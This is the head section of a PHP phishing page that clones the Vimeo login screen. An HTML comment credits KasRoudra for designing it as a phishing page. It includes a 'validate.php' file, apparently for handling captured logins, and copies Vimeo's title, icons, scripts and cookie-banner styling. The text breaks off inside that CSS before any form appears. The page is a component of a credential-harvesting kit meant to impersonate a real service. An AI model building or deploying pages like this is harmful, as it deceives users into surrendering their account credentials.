<?php
include "validate.php";
?>
<!DOCTYPE html>
<html>
    <!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
<head>
<meta charset="utf-8">
<meta property="fb:app_id" content="19884028963">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://vimeo.com//player.vimeo.com">
<link rel="preconnect" href="https://vimeo.com//i.vimeocdn.com">
<link rel="preconnect" href="https://vimeo.com//f.vimeocdn.com">
<link rel="search" type="application/opensearchdescription+xml" href="https://vimeo.com/search/opensearch.xml" title="Vimeo">
<link rel="logo" type="image/svg" href="https://f.vimeocdn.com/logo.svg">

    
            <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5.0,user-scalable=yes">
    
                        <meta property="og:image" content="https://f.vimeocdn.com/images_v6/logo.png?19dbc5f1f284f49d76f147bc8d2c6e95f789ab69">
            
        <meta name="robots" content="index,follow">

    <meta name="description" content="Join the web’s most supportive community of creators and get high-quality tools for hosting, sharing, and streaming videos in gorgeous HD with no ads.">



            <link rel="canonical" href="https://vimeo.com/log_in">
        <link rel="apple-touch-icon-precomposed" href="https://i.vimeocdn.com/favicon/main-touch_180">

<link rel="mask-icon" href="https://f.vimeocdn.com/svg/legacy_view_support/iris_icon_v_64.svg?19dbc5f1f284f49d76f147bc8d2c6e95f789ab69" color="#17272e">

    <link rel="shortcut icon" href="https://f.vimeocdn.com/images_v6/favicon.ico?19dbc5f1f284f49d76f147bc8d2c6e95f789ab69" data-play="https://i.vimeocdn.com/favicon/play_32" data-pause="https://i.vimeocdn.com/favicon/pause_32">

<meta name="msapplication-TileImage" content="https://i.vimeocdn.com/favicon/main-touch_144">
<meta name="msapplication-TileColor" content="#00adef">
        <title>Log in to Vimeo</title>
        <script type="text/javascript" async="" class="optanon-category-C0002" src="https://f.vimeocdn.com/js_opt/vendor/siftscience/siftscience.1.0_53760d6e69fbb47fc2bd2f72f3e231df.min.js"></script><script src="https://js-agent.newrelic.com/nr-spa-1208.min.js"></script><script src="https://f.vimeocdn.com/p/4.6.2/js/player.js"></script>
        <link rel="stylesheet" href="./style.css" />
        <!--<link rel="stylesheet" href="https://f.vimeocdn.com/p/4.6.2/css/player.css">-->

        
<style>
  #ot-sdk-btn {
    display: none;
  }
</style>

<script type="text/javascript">
  function OptanonWrapper() {
    /**
     * Sending location data for blocking GTM cookies
     */
    oneTrustTriggered = true;
    var location = OneTrust.getGeolocationData();
    if(window && window._gtm) {
      window._gtm.push(location);
    }
    /**
     * This is needed in case the scripts loads before the onetrust btn loads
     */
    if(location && location.country === 'FR' && document.head) {
      var style = document.createElement('style');
      document.head.appendChild(style);
      var stylesheet = style.sheet;
      if (stylesheet) {
        stylesheet.insertRule('#ot-sdk-btn { display: inline-block !important; }');
      }
    }
  }
</script>
                                        
                            <!--<link rel="stylesheet" href="https://f.vimeocdn.com/styles/css_opt/global/icon_fonts_68eff39472980630c5a0832a2d4396c6.min.css">

    <link rel="stylesheet" href="https://f.vimeocdn.com/styles/css_opt/global_legacy_combined_fb0c2db398afcb4b3c49fd2114d8853f.min.css">
    <link rel="stylesheet" href="https://f.vimeocdn.com/styles/css_opt/global_legacy_shared_combined_376f065b48cb8a81641f4983213ea0da.min.css">
    <link rel="stylesheet" href="https://f.vimeocdn.com/styles/css_opt/logged_out_registration_combined_85efa651c08411a09da2fb3b902319a6.min.css">
    <link rel="stylesheet" href="https://f.vimeocdn.com/styles/css_opt/global/force_standard_to_be_responsive_a864ad7dbc18ffecf2e11b0d4646fe95.min.css">-->









    <style id="onetrust-style">#onetrust-banner-sdk{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}#onetrust-banner-sdk .onetrust-vendors-list-handler{cursor:pointer;color:#1f96db;font-size:inherit;font-weight:bold;text-decoration:none;margin-left:5px}#onetrust-banner-sdk .onetrust-vendors-list-handler:hover{color:#1f96db}#onetrust-banner-sdk:focus{outline:2px solid #000;outline-offset:-2px}#onetrust-banner-sdk a:focus{outline:2px solid #000}#onetrust-banner-sdk #onetrust-accept-btn-handler,#onetrust-banner-sdk #onetrust-reject-all-handler,#onetrust-banner-sdk #onetrust-pc-btn-handler{outline-offset:1px}#onetrust-banner-sdk .ot-close-icon,#onetrust-pc-sdk .ot-close-icon,#ot-sync-ntfy .ot-close-icon{background-image:url("data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMzQ4LjMzM3B4IiBoZWlnaHQ9IjM0OC4zMzNweCIgdmlld0JveD0iMCAwIDM0OC4zMzMgMzQ4LjMzNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzQ4LjMzMyAzNDguMzM0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZmlsbD0iIzU2NTY1NiIgZD0iTTMzNi41NTksNjguNjExTDIzMS4wMTYsMTc0LjE2NWwxMDUuNTQzLDEwNS41NDljMTUuNjk5LDE1LjcwNSwxNS42OTksNDEuMTQ1LDAsNTYuODVjLTcuODQ0LDcuODQ0LTE4LjEyOCwxMS43NjktMjguNDA3LDExLjc2OWMtMTAuMjk2LDAtMjAuNTgxLTMuOTE5LTI4LjQxOS0xMS43NjlMMTc0LjE2NywyMzEuMDAzTDY4LjYwOSwzMzYuNTYzYy03Ljg0Myw3Ljg0NC0xOC4xMjgsMTEuNzY5LTI4LjQxNiwxMS43NjljLTEwLjI4NSwwLTIwLjU2My0zLjkxOS0yOC40MTMtMTEuNzY5Yy0xNS42OTktMTUuNjk4LTE1LjY5OS00MS4xMzksMC01Ni44NWwxMDUuNTQtMTA1LjU0OUwxMS43NzQsNjguNjExYy0xNS42OTktMTUuNjk5LTE1LjY5OS00MS4xNDUsMC01Ni44NDRjMTUuNjk2LTE1LjY4Nyw0MS4xMjctMTUuNjg3LDU2LjgyOSwwbDEwNS41NjMsMTA1LjU1NEwyNzkuNzIxLDExLjc2N2MxNS43MDUtMTUuNjg3LDQxLjEzOS0xNS42ODcsNTYuODMyLDBDMzUyLjI1OCwyNy40NjYsMzUyLjI1OCw1Mi45MTIsMzM2LjU1OSw2OC42MTF6Ii8+PC9nPjwvc3ZnPg==");background-size:contain;background-repeat:no-repeat;background-position:center;height:12px;width:12px}#onetrust-banner-sdk .powered-by-logo,#onetrust-banner-sdk .ot-pc-footer-logo a,#onetrust-pc-sdk .powered-by-logo,#onetrust-pc-sdk .ot-pc-footer-logo a,#ot-sync-ntfy .powered-by-logo,#ot-sync-ntfy .ot-pc-footer-logo a{background-size:contain;background-repeat:no-repeat;background-position:center;height:25px;width:152px;display:block}#onetrust-banner-sdk h3 *,#onetrust-banner-sdk h4 *,#onetrust-banner-sdk h6 *,#onetrust-banner-sdk button *,#onetrust-banner-sdk a[data-parent-id] *,#onetrust-pc-sdk h3 *,#onetrust-pc-sdk h4 *,#onetrust-pc-sdk h6 *,#onetrust-pc-sdk button *,#onetrust-pc-sdk a[data-parent-id] *,#ot-sync-ntfy h3 *,#ot-sync-ntfy h4 *,#ot-sync-ntfy h6 *,#ot-sync-ntfy button *,#ot-sync-ntfy a[data-parent-id] *{font-size:inherit;font-weight:inherit;color:inherit}#onetrust-banner-sdk .ot-hide,#onetrust-pc-sdk .ot-hide,#ot-sync-ntfy .ot-hide{display:none !important}#onetrust-pc-sdk .ot-sdk-row .ot-sdk-column{padding:0}#onetrust-pc-sdk .ot-sdk-container{padding-right:0}#onetrust-pc-sdk .ot-sdk-row{flex-direction:initial;width:100%}#onetrust-pc-sdk [type="checkbox"]:checked,#onetrust-pc-sdk [type="checkbox"]:not(:checked){pointer-events:initial}#onetrust-pc-sdk [type="checkbox"]:disabled+label::before,#onetrust-pc-sdk [type="checkbox"]:disabled+label:after,#onetrust-pc-sdk [type="checkbox"]:disabled+label{pointer-events:none;opacity:0.7}#onetrust-pc-sdk #vendor-list-content{transform:translate3d(0, 0, 0)}#onetrust-pc-sdk li input[type="checkbox"]{z-index:1}#onetrust-pc-sdk li .ot-checkbox label{z-index:2}#onetrust-pc-sdk li .ot-checkbox input[type="checkbox"]{height:auto;width:auto}#onetrust-pc-sdk li .host-title a,#onetrust-pc-sdk li .ot-host-name a,#onetrust-pc-sdk li .accordion-text,#onetrust-pc-sdk li .ot-acc-txt{z-index:2;position:relative}#onetrust-pc-sdk input{margin:3px 0.1ex}#onetrust-pc-sdk .pc-logo,#onetrust-pc-sdk .ot-pc-logo{height:60px;width:180px;background-position:center;background-size:contain;background-repeat:no-repeat}#onetrust-pc-sdk .screen-reader-only,#onetrust-pc-sdk .ot-scrn-rdr,.ot-sdk-cookie-policy .screen-reader-only,.ot-sdk-cookie-policy .ot-scrn-rdr{border:0;clip:rect(0 0 0 0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}#onetrust-pc-sdk.ot-fade-in,.onetrust-pc-dark-filter.ot-fade-in,#onetrust-banner-sdk.ot-fade-in{animation-name:onetrust-fade-in;animation-duration:400ms;animation-timing-function:ease-in-out}#onetrust-pc-sdk.ot-hide{display:none !important}.onetrust-pc-dark-filter.ot-hide{display:none !important}#ot-sdk-btn.ot-sdk-show-settings,#ot-sdk-btn.optanon-show-settings{color:#68b631;border:1px solid #68b631;height:auto;white-space:normal;word-wrap:break-word;padding:0.8em 2em;font-size:0.8em;line-height:1.2;cursor:pointer;-moz-transition:0.1s ease;-o-transition:0.1s ease;-webkit-transition:1s ease;transition:0.1s ease}#ot-sdk-btn.ot-sdk-show-settings:hover,#ot-sdk-btn.optanon-show-settings:hover{color:#fff;background-color:#68b631}.onetrust-pc-dark-filter{background:rgba(0,0,0,0.5);z-index:2147483646;width:100%;height:100%;overflow:hidden;position:fixed;top:0;bottom:0;left:0}@keyframes onetrust-fade-in{0%{opacity:0}100%{opacity:1}}.ot-cookie-label{text-decoration:underline}@media only screen and (min-width: 426px) and (max-width: 896px) and (orientation: landscape){#onetrust-pc-sdk p{font-size:0.75em}}#onetrust-banner-sdk .banner-option-input:focus+label{outline:1px solid #000;outline-style:auto}.category-vendors-list-handler+a:focus,.category-vendors-list-handler+a:focus-visible{outline:2px solid #000}
#onetrust-banner-sdk,#onetrust-pc-sdk,#ot-sdk-cookie-policy,#ot-sync-ntfy{font-size:16px}#onetrust-banner-sdk *,#onetrust-banner-sdk ::after,#onetrust-banner-sdk ::before,#onetrust-pc-sdk *,#onetrust-pc-sdk ::after,#onetrust-pc-sdk ::before,#ot-sdk-cookie-policy *,#ot-sdk-cookie-policy ::after,#ot-sdk-cookie-policy ::before,#ot-sync-ntfy *,#ot-sync-ntfy ::after,#ot-sync-ntfy ::before{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box}#onetrust-banner-sdk div,#onetrust-banner-sdk span,#onetrust-banner-sdk h1,#onetrust-banner-sdk h2,#onetrust-banner-sdk h3,#onetrust-banner-sdk h4,#onetrust-banner-sdk h5,#onetrust-banner-sdk h6,#onetrust-banner-sdk p,#onetrust-banner-sdk img,#onetrust-banner-sdk svg,#onetrust-banner-sdk button,#onetrust-banner-sdk section,#onetrust-banner-sdk a,#onetrust-banner-sdk label,#onetrust-banner-sdk input,#onetrust-banner-sdk ul,#onetrust-banner-sdk li,#onetrust-banner-sdk nav,#onetrust-banner-sdk table,#onetrust-banner-sdk thead,#onetrust-banner-sdk tr,#onetrust-banner-sdk td,#onetrust-banner-sdk tbody,#onetrust-banner-sdk .ot-main-content,#onetrust-banner-sdk .ot-toggle,#onetrust-banner-sdk #ot-content,#onetrust-banner-sdk #ot-pc-content,#onetrust-banner-sdk .checkbox,#onetrust-pc-sdk div,#onetrust-pc-sdk span,#onetrust-pc-sdk h1,#onetrust-pc-sdk h2,#onetrust-pc-sdk h3,#onetrust-pc-sdk h4,#onetrust-pc-sdk h5,#onetrust-pc-sdk h6,#onetrust-pc-sdk p,#onetrust-pc-sdk img,#onetrust-pc-sdk svg,#onetrust-pc-sdk button,#onetrust-pc-sdk section,#onetrust-pc-sdk a,#onetrust-pc-sdk label,#onetrust-pc-sdk input,#onetrust-pc-sdk ul,#onetrust-pc-sdk li,#onetrust-pc-sdk nav,#onetrust-pc-sdk table,#onetrust-pc-sdk thead,#onetrust-pc-sdk tr,#onetrust-pc-sdk td,#onetrust-pc-sdk tbody,#onetrust-pc-sdk .ot-main-content,#onetrust-pc-sdk .ot-toggle,#onetrust-pc-sdk #ot-content,#onetrust-pc-sdk #ot-pc-content,#onetrust-pc-sdk .checkbox,#ot-sdk-cookie-policy div,#ot-sdk-cookie-policy span,#ot-sdk-cookie-policy h1,#ot-sdk-cookie-policy h2,#ot-sdk-cookie-policy h3,#ot-sdk-cookie-policy h4,#ot-sdk-cookie-policy h5,#ot-sdk-cookie-policy h6,#ot-sdk-cookie-policy p,#ot-sdk-cookie-policy img,#ot-sdk-cookie-policy svg,#ot-sdk-cookie-policy button,#ot-sdk-cookie-policy section,#ot-sdk-cookie-policy a,#ot-sdk-cookie-policy label,#ot-sdk-cookie-policy input,#ot-sdk-cookie-policy ul,#ot-sdk-cookie-policy li,#ot-sdk-cookie-policy nav,#ot-sdk-cookie-policy table,#ot-sdk-cookie-policy thead,#ot-sdk-cookie-policy tr,#ot-sdk-cookie-policy td,#ot-sdk-cookie-policy tbody,#ot-sdk-cookie-policy .ot-main-content,#ot-sdk-cookie-policy .ot-toggle,#ot-sdk-cookie-policy #ot-content,#ot-sdk-cookie-policy #ot-pc-content,#ot-sdk-cookie-policy .checkbox,#ot-sync-ntfy div,#ot-sync-ntfy span,#ot-sync-ntfy h1,#ot-sync-ntfy h2,#ot-sync-ntfy h3,#ot-sync-ntfy h4,#ot-sync-ntfy h5,#ot-sync-ntfy h6,#ot-sync-ntfy p,#ot-sync-ntfy img,#ot-sync-ntfy svg,#ot-sync-ntfy button,#ot-sync-ntfy section,#ot-sync-ntfy a,#ot-sync-ntfy label,#ot-sync-ntfy input,#ot-sync-ntfy ul,#ot-sync-ntfy li,#ot-sync-ntfy nav,#ot-sync-ntfy table,#ot-sync-ntfy thead,#ot-sync-ntfy tr,#ot-sync-ntfy td,#ot-sync-ntfy tbody,#ot-sync-ntfy .ot-main-content,#ot-sync-ntfy .ot-toggle,#ot-sync-ntfy #ot-content,#ot-sync-ntfy #ot-pc-content,#ot-sync-ntfy .checkbox{font-family:inherit;font-weight:normal;-webkit-font-smoothing:auto;letter-spacing:normal;line-height:normal;padding:0;margin:0;height:auto;min-height:0;max-height:none;width:auto;min-width:0;max-width:none;border-radius:0;border:none;clear:none;float:none;position:static;bottom:auto;left:auto;right:auto;top:auto;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;white-space:normal;background:none;overflow:visible;vertical-align:baseline;visibility:visible;z-index:auto;box-shadow:none}#onetrust-banner-sdk label:before,#onetrust-banner-sdk label:after,#onetrust-banner-sdk .checkbox:after,#onetrust-banner-sdk .checkbox:before,#onetrust-pc-sdk label:before,#onetrust-pc-sdk label:after,#onetrust-pc-sdk .checkbox:after,#onetrust-pc-sdk .checkbox:before,#ot-sdk-cookie-policy label:before,#ot-sdk-cookie-policy label:after,#ot-sdk-cookie-policy .checkbox:after,#ot-sdk-cookie-policy .checkbox:before,#ot-sync-ntfy label:before,#ot-sync-ntfy label:after,#ot-sync-ntfy .checkbox:after,#ot-sync-ntfy .checkbox:before{content:"";content:none}
#onetrust-banner-sdk .ot-sdk-container,#onetrust-pc-sdk .ot-sdk-container,#ot-sdk-cookie-policy .ot-sdk-container{position:relative;width:100%;max-width:100%;margin:0 auto;padding:0 20px;box-sizing:border-box}#onetrust-banner-sdk .ot-sdk-column,#onetrust-banner-sdk .ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-column,#onetrust-pc-sdk .ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-columns{width:100%;float:left;box-sizing:border-box;padding:0;display:initial}@media (min-width: 400px){#onetrust-banner-sdk .ot-sdk-container,#onetrust-pc-sdk .ot-sdk-container,#ot-sdk-cookie-policy .ot-sdk-container{width:90%;padding:0}}@media (min-width: 550px){#onetrust-banner-sdk .ot-sdk-container,#onetrust-pc-sdk .ot-sdk-container,#ot-sdk-cookie-policy .ot-sdk-container{width:100%}#onetrust-banner-sdk .ot-sdk-column,#onetrust-banner-sdk .ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-column,#onetrust-pc-sdk .ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-column,#ot-sdk-cookie-policy .ot-sdk-columns{margin-left:4%}#onetrust-banner-sdk .ot-sdk-column:first-child,#onetrust-banner-sdk .ot-sdk-columns:first-child,#onetrust-pc-sdk .ot-sdk-column:first-child,#onetrust-pc-sdk .ot-sdk-columns:first-child,#ot-sdk-cookie-policy .ot-sdk-column:first-child,#ot-sdk-cookie-policy .ot-sdk-columns:first-child{margin-left:0}#onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns{width:13.3333333333%}#onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns{width:22%}#onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns{width:30.6666666667%}#onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns{width:65.3333333333%}#onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns{width:74%}#onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns{width:82.6666666667%}#onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns{width:91.3333333333%}#onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,#onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,#ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns{width:100%;margin-left:0}}#onetrust-banner-sdk h1,#onetrust-banner-sdk h2,#onetrust-banner-sdk h3,#onetrust-banner-sdk h4,#onetrust-banner-sdk h5,#onetrust-banner-sdk h6,#onetrust-pc-sdk h1,#onetrust-pc-sdk h2,#onetrust-pc-sdk h3,#onetrust-pc-sdk h4,#onetrust-pc-sdk h5,#onetrust-pc-sdk h6,#ot-sdk-cookie-policy h1,#ot-sdk-cookie-policy h2,#ot-sdk-cookie-policy h3,#ot-sdk-cookie-policy h4,#ot-sdk-cookie-policy h5,#ot-sdk-cookie-policy h6{margin-top:0;font-weight:600;font-family:inherit}#onetrust-banner-sdk h1,#onetrust-pc-sdk h1,#ot-sdk-cookie-policy h1{font-size:1.5rem;line-height:1.2}#onetrust-banner-sdk h2,#onetrust-pc-sdk h2,#ot-sdk-cookie-policy h2{font-size:1.5rem;line-height:1.25}#onetrust-banner-sdk h3,#onetrust-pc-sdk h3,#ot-sdk-cookie-policy h3{font-size:1.5rem;line-height:1.3}#onetrust-banner-sdk h4,#onetrust-pc-sdk h4,#ot-sdk-cookie-policy h4{font-size:1.5rem;line-height:1.35}#onetrust-banner-sdk h5,#onetrust-pc-sdk h5,#ot-sdk-cookie-policy h5{font-size:1.5rem;line-height:1.5}#onetrust-banner-sdk h6,#onetrust-pc-sdk h6,#ot-sdk-cookie-policy h6{font-size:1.5rem;line-height:1.6}@media (min-width: 550px){#onetrust-banner-sdk h1,#onetrust-pc-sdk h1,#ot-sdk-cookie-policy h1{font-size:1.5rem}#onetrust-banner-sdk h2,#onetrust-pc-sdk h2,#ot-sdk-cookie-policy h2{font-size:1.5rem}#onetrust-banner-sdk h3,#onetrust-pc-sdk h3,#ot-sdk-cookie-policy h3{font-size:1.5rem}#onetrust-banner-sdk h4,#onetrust-pc-sdk h4,#ot-sdk-cookie-policy h4{font-size:1.5rem}#onetrust-banner-sdk h5,#onetrust-pc-sdk h5,#ot-sdk-cookie-policy h5{font-size:1.5rem}#onetrust-banner-sdk h6,#onetrust-pc-sdk h6,#ot-sdk-cookie-policy h6{font-size:1.5rem}}#onetrust-banner-sdk p,#onetrust-pc-sdk p,#ot-sdk-cookie-policy p{margin:0 0 1em 0;font-family:inherit;line-height:normal}#onetrust-banner-sdk a,#onetrust-pc-sdk a,#ot-sdk-cookie-policy a{color:#565656;text-decoration:underline}#onetrust-banner-sdk a:hover,#onetrust-pc-sdk a:hover,#ot-sdk-cookie-policy a:hover{color:#565656;text-decoration:none}#onetrust-banner-sdk .ot-sdk-button,#onetrust-banner-sdk button,#onetrust-pc-sdk .ot-sdk-button,#onetrust-pc-sdk button,#ot-sdk-cookie-policy .ot-sdk-button,#ot-sdk-cookie-policy button{margin-bottom:1rem;font-family:inherit}#onetrust-banner-sdk .ot-sdk-button,#onetrust-banner-sdk button,#onetrust-pc-sdk .ot-sdk-button,#onetrust-pc-sdk button,#ot-sdk-cookie-policy .ot-sdk-button,#ot-sdk-cookie-policy button{display:inline-block;height:38px;padding:0 30px;color:#555;text-align:center;font-size:0.9em;font-weight:400;line-height:38px;letter-spacing:0.01em;text-decoration:none;white-space:nowrap;background-color:transparent;border-radius:2px;border:1px solid #bbb;cursor:pointer;box-sizing:border-box}#onetrust-banner-sdk .ot-sdk-button:hover,#onetrust-banner-sdk :not(.ot-leg-btn-container)>button:hover,#onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,#onetrust-pc-sdk .ot-sdk-button:hover,#onetrust-pc-sdk :not(.ot-leg-btn-container)>button:hover,#onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,#ot-sdk-cookie-policy .ot-sdk-button:hover,#ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:hover,#ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus{color:#333;border-color:#888;opacity:0.7}#onetrust-banner-sdk .ot-sdk-button:focus,#onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,#onetrust-pc-sdk .ot-sdk-button:focus,#onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,#ot-sdk-cookie-policy .ot-sdk-button:focus,#ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus{outline:2px solid #000}#onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,#onetrust-banner-sdk button.ot-sdk-button-primary,#onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary,#onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary,#onetrust-banner-sdk input[type="button"].ot-sdk-button-primary,#onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,#onetrust-pc-sdk button.ot-sdk-button-primary,#onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary,#onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary,#onetrust-pc-sdk input[type="button"].ot-sdk-button-primary,#ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,#ot-sdk-cookie-policy button.ot-sdk-button-primary,#ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary,#ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary,#ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary{color:#fff;background-color:#33c3f0;border-color:#33c3f0}#onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,#onetrust-banner-sdk button.ot-sdk-button-primary:hover,#onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:hover,#onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:hover,#onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:hover,#onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,#onetrust-banner-sdk button.ot-sdk-button-primary:focus,#onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:focus,#onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:focus,#onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:focus,#onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,#onetrust-pc-sdk button.ot-sdk-button-primary:hover,#onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:hover,#onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:hover,#onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:hover,#onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,#onetrust-pc-sdk button.ot-sdk-button-primary:focus,#onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:focus,#onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:focus,#onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:focus,#ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,#ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,#ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:hover,#ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:hover,#ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:hover,#ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,#ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,#ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:focus,#ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:focus,#ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:focus{color:#fff;background-color:#1eaedb;border-color:#1eaedb}#onetrust-banner-sdk input[type="text"],#onetrust-pc-sdk input[type="text"],#ot-sdk-cookie-policy input[type="text"]{height:38px;padding:6px 10px;background-color:#fff;border:1px solid #d1d1d1;border-radius:4px;box-shadow:none;box-sizing:border-box}#onetrust-banner-sdk input[type="text"],#onetrust-pc-sdk input[type="text"],#ot-sdk-cookie-policy input[type="text"]{-webkit-appearance:none;-moz-appearance:none;appearance:none}#onetrust-banner-sdk input[type="text"]:focus,#onetrust-pc-sdk input[type="text"]:focus,#ot-sdk-cookie-policy input[type="text"]:focus{border:1px solid #000;outline:0}#onetrust-banner-sdk label,#onetrust-pc-sdk label,#ot-sdk-cookie-policy label{display:block;margin-bottom:0.5rem;font-weight:600}#onetrust-banner-sdk input[type="checkbox"],#onetrust-pc-sdk input[type="checkbox"],#ot-sdk-cookie-policy input[type="checkbox"]{display:inline}#onetrust-banner-sdk ul,#onetrust-pc-sdk ul,#ot-sdk-cookie-policy ul{list-style:circle inside}#onetrust-banner-sdk ul,#onetrust-pc-sdk ul,#ot-sdk-cookie-policy ul{padding-left:0;margin-top:0}#onetrust-banner-sdk ul ul,#onetrust-pc-sdk ul ul,#ot-sdk-cookie-policy ul ul{margin:1.5rem 0 1.5rem 3rem;font-size:90%}#onetrust-banner-sdk li,#onetrust-pc-sdk li,#ot-sdk-cookie-policy li{margin-bottom:1rem}#onetrust-banner-sdk th,#onetrust-banner-sdk td,#onetrust-pc-sdk th,#onetrust-pc-sdk td,#ot-sdk-cookie-policy th,#ot-sdk-cookie-policy td{padding:12px 15px;text-align:left;border-bottom:1px solid #e1e1e1}#onetrust-banner-sdk button,#onetrust-pc-sdk button,#ot-sdk-cookie-policy button{margin-bottom:1rem;font-family:inherit}#onetrust-banner-sdk .ot-sdk-container:after,#onetrust-banner-sdk .ot-sdk-row:after,#onetrust-pc-sdk .ot-sdk-container:after,#onetrust-pc-sdk .ot-sdk-row:after,#ot-sdk-cookie-policy .ot-sdk-container:after,#ot-sdk-cookie-policy .ot-sdk-row:after{content:"";display:table;clear:both}#onetrust-banner-sdk .ot-sdk-row,#onetrust-pc-sdk .ot-sdk-row,#ot-sdk-cookie-policy .ot-sdk-row{margin:0;max-width:none;display:block}
#onetrust-banner-sdk{box-shadow:0 0 18px rgba(0,0,0,.2)}#onetrust-banner-sdk.otFlat{position:fixed;z-index:2147483645;bottom:0;right:0;left:0;background-color:#fff;max-height:90%;overflow-x:hidden;overflow-y:auto}#onetrust-banner-sdk.otFlat.top{top:0px;bottom:auto}#onetrust-banner-sdk.otRelFont{font-size:1rem}#onetrust-banner-sdk>.ot-sdk-container{overflow:hidden}#onetrust-banner-sdk::-webkit-scrollbar{width:11px}#onetrust-banner-sdk::-webkit-scrollbar-thumb{border-radius:10px;background:#c1c1c1}#onetrust-banner-sdk{scrollbar-arrow-color:#c1c1c1;scrollbar-darkshadow-color:#c1c1c1;scrollbar-face-color:#c1c1c1;scrollbar-shadow-color:#c1c1c1}#onetrust-banner-sdk #onetrust-policy{margin:1.25em 0 .625em 2em;overflow:hidden}#onetrust-banner-sdk #onetrust-policy .ot-gv-list-handler{float:left;font-size:.82em;padding:0;margin-bottom:0;border:0;line-height:normal;height:auto;width:auto}#onetrust-banner-sdk #onetrust-policy-title{font-size:1.2em;line-height:1.3;margin-bottom:10px}#onetrust-banner-sdk #onetrust-policy-text{clear:both;text-align:left;font-size:.88em;line-height:1.4}#onetrust-banner-sdk #onetrust-policy-text *{font-size:inherit;line-height:inherit}#onetrust-banner-sdk #onetrust-policy-text a{font-weight:bold;margin-left:5px}#onetrust-banner-sdk 